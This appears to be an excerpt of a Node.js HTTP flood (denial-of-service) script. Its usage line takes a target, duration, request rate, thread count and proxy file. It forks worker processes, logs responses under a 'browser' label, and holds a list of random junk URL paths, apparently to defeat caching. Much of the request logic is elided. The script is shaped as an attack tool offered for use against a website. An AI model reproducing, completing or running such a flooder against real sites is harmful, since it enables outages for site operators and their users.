 ...
 if (process.argv.length < 7){console.log(`node index.js target time rate(32) thread proxy.txt`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`[\x1b[35mbrowser\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.log(`[\x1b[35mbrowser\x1b[0m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`[\x1b[35mbrowser\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(`[\x1b[35mbrowser\x1b[0m] ${getCurrentTime()} ${error.message}`);
      }
    });
}
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[\x1b[35mbrowser\x1b[0m] ${getCurrentTime()} browser starting...`);
  }
  console.log(`[\x1b[35mbrowser\x1b[0m] ${getCurrentTime()} browser starting..`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[\x1b[35mbrowser\x1b[0m] ${getCurrentTime()} done`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
...
const pathts = [
  ...
  "utretururutrutru",
  "reuturtururtu",
  "rtutrururtururururutru",
  "ttttttttttttttttttttttttttt",
  "turuywewuwerweryuwuwruweruwuwru",
  "erurweoiwoiweoitoewitoweitoewitoiewotiwotioitowe", 
  "rowperowwpiowerpwewefkwfewlfkpeeeeeeeeeeeeeeeeeiweprwipw",
  "weorprorpopoweporpeowpoweproewprroweortowoitpiwotioweitooiwet",
];
